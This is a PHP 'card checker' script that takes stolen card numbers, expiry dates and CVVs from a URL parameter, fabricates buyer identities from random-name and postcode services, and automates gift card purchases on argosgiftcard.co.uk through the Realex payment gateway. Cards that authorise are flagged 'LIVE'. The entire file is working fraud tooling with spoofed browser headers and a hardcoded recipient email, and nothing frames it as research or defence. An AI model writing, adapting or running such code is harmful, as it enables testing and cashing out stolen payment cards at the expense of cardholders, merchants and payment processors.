<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $postcodes = file_get_contents('http://api.postcodes.io/random/postcodes');
    $getUkPostcode = json_decode($postcodes, true);
    $postcode = $getUkPostcode['result']['postcode'];
    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united%20states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $city = preg_split("/[\s,]+/", $data['street2'])[0];
    $state = preg_split("/[\s,]+/", $data['street2'])[1];
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://argosgiftcard.co.uk/Argos/ByEmail/Argos/ChooseProduct',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $verifTok = curl_exec($ch);
    curl_close($ch);
    $firstTok = GetStr($verifTok, '<input name="__RequestVerificationToken" type="hidden" value="', '"');
    $giftCardId = GetStr($verifTok, 'id="GiftCardProductId" name="GiftCardProductId" type="hidden" value="', '"');
    $walletProductId = GetStr($verifTok, 'id="WalletProductId" name="WalletProductId" type="hidden" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://argosgiftcard.co.uk/Argos/ByEmail/Argos/ChooseProduct',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Origin: https://argosgiftcard.co.uk',
            'Referer: https://argosgiftcard.co.uk/Argos/ByEmail/Argos/ChooseProduct',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "__RequestVerificationToken=$firstTok&GiftCardProductId=$giftCardId&WalletProductId=$walletProductId&AddWallet=False&CurrencyId=1&Quantity=1&NextDaySelected=True&Country=United+Kingdom&Postcode=na&Address1=na&Town=na&FirstName=na&Surname=na&AddAnother=False&CountryId=1&LanguageId=1&GiftCardValueDropdown=&GiftCardPriceX=5&CardCarouselItemCount=12&From=Awet&To=Din&Email=zincronyx@gmail.com&EmailConfirm=zincronyx@gmail.com&Message=&deliverywhen=sendnow&DeliveryDate=2021-03-27&DeliveryHour=12&DeliveryMinute=00"
    ));
    $addToCart = curl_exec($ch);
    curl_close($ch);
    $secondTok = GetStr($addToCart, '<input name="__RequestVerificationToken" type="hidden" value="', '"');
    $salesOrderId = GetStr($addToCart, '<input type="hidden" id="SalesOrderId" name="SalesOrderId" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://argosgiftcard.co.uk/Argos/ByEmail/Argos/GetRealexForm?salesOrderId='.$salesOrderId,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://argosgiftcard.co.uk',
            'Referer: https://argosgiftcard.co.uk/Argos/ByEmail/Argos/Payment',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "SalesOrderId=$salesOrderId&LanguageLocalization=&__RequestVerificationToken=$secondTok&NameTitle=Mr&FirstName=$fname&Surname=$lname&Country=United+Kingdom&Address1=$street&Address2=&Address3=&Town=$city&County=&Postcode=$postcode&select-address=&select-international-address=&PhoneNumber=01412488361&Email=zincronyx@gmail.com&EmailConfirm=zincronyx@gmail.com&SelectedCard=Visa&AcceptTerms=true&AcceptTerms=false&Subscribe=false"
    ));
    foreach(explode("<input type=\"hidden\"", GetStr(curl_exec($ch), '<form id="RealexCheckoutForm" method="POST" action="https://pay.realexpayments.com/pay">', "</form>")) as $values){
        $form[GetStr($values, 'name="','"')] = GetStr($values, 'value="','"');
    }
    curl_close($ch);


    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/pay',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://argosgiftcard.co.uk',
            'Referer: https://argosgiftcard.co.uk/Argos/ByEmail/Argos/Payment',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => http_build_query($form)
    ));
    $guid = GetStr(curl_exec($ch), "https://pay.realexpayments.com/card.html?guid=", "\r\n");
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/3ds2/verifyEnrolled',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid='.$guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=&pas_cccvc=&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate="
    ));
    $verifyEnrolled = curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/api/cardIdentification',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid='.$guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=&pas_cccvc=&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate="
    ));
    $cardIdentification = curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.realexpayments.com/api/auth',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/card.html?guid='.$guid,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum=$cc&cardIdentifyError=&pas_expiry=$mm%2F".substr($yy, 2, 4)."&pas_cccvc=$cvv&pas_issuenumber=&pas_ccname=$fname+$lname&guid=$guid&dccchoice=&dccrate=&browserJavaEnabled=false&browserLanguage=en-US&screenColorDepth=24&screenHeight=1080&screenWidth=1920&timezoneUtcOffset=-480&paymentFormHeight=518&paymentFormWidth=600"
    ));
    $auth = json_decode(curl_exec($ch), true);
    curl_close($ch);

    $code = $auth['data']['response']['result'];
    $authCode = $auth['data']['response']['authcode'];
    $message = $auth['data']['response']['message'];
    $cvvResult = $auth['data']['response']['cvnresult'];

    if($code == "00") {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">CVV: '.$cvvResult.' | Message: '.$message.'</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">Code: '.$code.' | Message: '.$message.' | CVV: '.$cvvResult.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>